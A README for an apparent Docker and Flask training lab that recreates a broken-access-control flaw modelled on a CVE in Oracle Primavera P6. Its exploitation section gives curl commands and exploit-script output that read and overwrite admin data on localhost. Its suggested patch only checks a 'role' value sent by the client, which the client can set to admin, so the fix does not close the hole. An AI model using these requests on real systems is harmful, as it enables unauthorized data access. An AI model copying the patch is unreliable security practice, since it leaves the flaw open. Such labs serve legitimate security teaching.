
# CVE-2025-21526 Simulation Lab (Docker + Python)

This repository simulates a **CVE-like vulnerability** inspired by [CVE-2025-21526](https://nvd.nist.gov/vuln/detail/CVE-2025-21526), which allows **unauthorized users to read/write privileged data** due to **improper authorization** in Oracle Primavera P6 EPPM.

Here, we replicate a similar flaw in a simple Flask application to demonstrate how access control vulnerabilities work â€” and how to patch them.

## ğŸ§  Key Concepts

- Broken Access Control
- Unauthorized read/write access
- Exploitation with low-privileged user
- Ethical security testing in Docker

## ğŸ§¾ Features

- Flask web app simulating vulnerable endpoints
- Docker + Docker Compose support
- Python exploit script to demonstrate unauthorized access

## ğŸ“ Project Structure

```
.
â”œâ”€â”€ app.py               # Vulnerable Flask app
â”œâ”€â”€ exploit.py           # Exploit script
â”œâ”€â”€ Dockerfile           # Docker image definition
â”œâ”€â”€ docker-compose.yml   # Orchestration
â””â”€â”€ README.md            # You're here!
```

## ğŸš€ Getting Started

### 1ï¸âƒ£ Prerequisites

- Docker & Docker Compose
- Python 3.x

### 2ï¸âƒ£ Clone the Repository

```bash
git clone https://github.com/sonalvijit/cve.git
cd /cve/CVE-2025-21526
```

### 3ï¸âƒ£ Build and Run the App

```bash
docker-compose up --build
```

App runs at: [http://localhost:5000](http://localhost:5000)

## ğŸ§ª Exploitation

### Unauthorized Read

```bash
curl "http://localhost:5000/get-data?user=admin"
```

### Unauthorized Write

```bash
curl -X POST -d "user=admin&data=Hacked!" http://localhost:5000/update-data
```

### Or Use the Python Script

```bash
python3 exploit.py
```

Expected output:

```
[+] Attempting to read data for user: admin
Response: 200
{'role': 'admin', 'data': 'Confidential reports'}

[+] Attempting to update data for user: admin
Response: 200
Updated

[+] Attempting to read data for user: admin
Response: 200
{'role': 'admin', 'data': 'Hacked!'}
```

## ğŸ›¡ï¸ Patching the Vulnerability (Optional)

To simulate a patch, add role validation before updating data in `app.py`:

```python
@app.route("/secure-update", methods=["POST"])
def secure_update():
    role = request.form.get("role")
    if role != "admin":
        return "Forbidden", 403
    # Update logic
```

## ğŸ“š Reference

- CVE Link: [CVE-2025-21526](https://nvd.nist.gov/vuln/detail/CVE-2025-21526)
- CWE: [CWE-862: Missing Authorization](https://cwe.mitre.org/data/definitions/862.html)

## âš ï¸ Disclaimer

This project is for **educational and ethical testing** purposes **only**. Do **not** use this code on any production or unauthorized systems.

